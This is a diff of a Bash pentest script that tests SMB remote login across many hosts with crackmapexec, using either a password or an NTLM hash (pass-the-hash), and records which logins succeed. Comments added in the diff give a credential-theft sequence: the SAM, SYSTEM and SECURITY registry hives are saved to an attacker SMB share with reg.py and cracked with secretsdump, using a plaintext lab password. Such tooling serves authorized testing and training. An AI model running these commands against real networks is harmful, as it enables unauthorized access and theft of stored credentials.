@@ -1,7 +1,6 @@
 #!/bin/bash
 # Author: Daniel Torres
 # daniel.torres@owasp.org
-# ISB.COM.BO
 THREADS="30"
 OKBLUE='\033[94m'
 OKRED='\033[91m'
@@ -60,31 +59,49 @@ echo ""
 exit
 fi
 
+#1) smbserver.py -smb2support share .
+#2) reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.132\share'
+#   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SAM' -o '\\192.168.56.132\share'
+#   reg.py NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.132\share'
+#3) secretsdump.py -sam SAM.save -system SYSTEM.save LOCAL
+#   secretsdump -security SECURITY.save -system SYSTEM.save LOCAL # DCC2 (Domain Cached credentials 2 ) hashcat mode 2100
 echo -e "$OKBLUE Probando con usuario: $USUARIO  y hash $HASH $RESET"
 ######################
 
-  for ip in $(cat $FILE); do	
+  for ip in $(ls .enumeracion2_archived| grep 'crackmapexec' | cut -d "_" -f1); do
 			echo -e "[+] $OKBLUE Testeando $ip .. $RESET"
-			if [ $HASH = NULL ] ; then
+			if [ -z $HASH ] ; then
 			#echo "PASSWORD $PASSWORD"				
-				docker run  -it byt3bl33d3r/crackmapexec smb $ip -u $USUARIO -p $PASSWORD --local-auth -x ipconfig | tee logs/vulnerabilidades/"$ip"_windows_logeoRemoto.txt
+				echo "Usando password $PASSWORD"
+				crackmapexec smb $ip -u $USUARIO -p $PASSWORD --local-auth  | tee logs/vulnerabilidades/"$ip"_smb_logeoRemoto1.txt #local
+				crackmapexec smb $ip -u $USUARIO -p $PASSWORD  | tee logs/vulnerabilidades/"$ip"_smb_logeoRemoto2.txt	#dominio
 			else
-				pth-winexe -U $USUARIO%aad3b435b51404eeaad3b435b51404ee:$HASH //$ip ipconfig > logs/vulnerabilidades/"$ip"_windows_logeoRemoto.txt
-					
+				echo "Usando HASH $HASH"
+				echo "crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth "
+				crackmapexec smb $ip -u $USUARIO -H $HASH --local-auth  | tee logs/vulnerabilidades/"$ip"_smb_logeoRemoto1.txt #local
+				crackmapexec smb $ip -u $USUARIO -H $HASH  | tee logs/vulnerabilidades/"$ip"_smb_logeoRemoto2.txt #dominio					
 			fi
 			
-			egrep -qai "IPv4" logs/vulnerabilidades/"$ip"_windows_logeoRemoto.txt
+			grep -qai '+' logs/vulnerabilidades/"$ip"_smb_logeoRemoto1.txt
 			greprc=$?
 			if [[ $greprc -eq 0 ]] ; then						
 				echo -e "\t$OKRED[i] Logeo remoto habilitado $RESET"
-				if [ $HASH = NULL ] ; then
-					echo -e "Usuario:$USUARIO Pasword:$password" >> .vulnerabilidades/"$ip"_windows_logeoRemoto.txt
+				if [ -z $HASH ] ; then
+					echo -e "Usuario:$USUARIO Pasword:$password (local)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
 				else
-					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH" >> .vulnerabilidades/"$ip"_windows_logeoRemoto.txt
-				fi
-				
-			else
-				echo -e "\t$OKGREEN[!] OK \n $RESET"				
+					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (local)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
+				fi			
+			fi	
+
+			grep -qai '+' logs/vulnerabilidades/"$ip"_smb_logeoRemoto2.txt
+			greprc=$?
+			if [[ $greprc -eq 0 ]] ; then						
+				echo -e "\t$OKRED[i] Logeo remoto habilitado $RESET"
+				if [ -z $HASH ] ; then
+					echo -e "Usuario:$USUARIO Pasword:$password (dominio)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
+				else
+					echo -e "Usuario:$USUARIO Hash:aad3b435b51404eeaad3b435b51404ee:$HASH (dominio)" >> .vulnerabilidades/"$ip"_smb_logeoRemoto.txt
+				fi			
 			fi	
 					
 	done
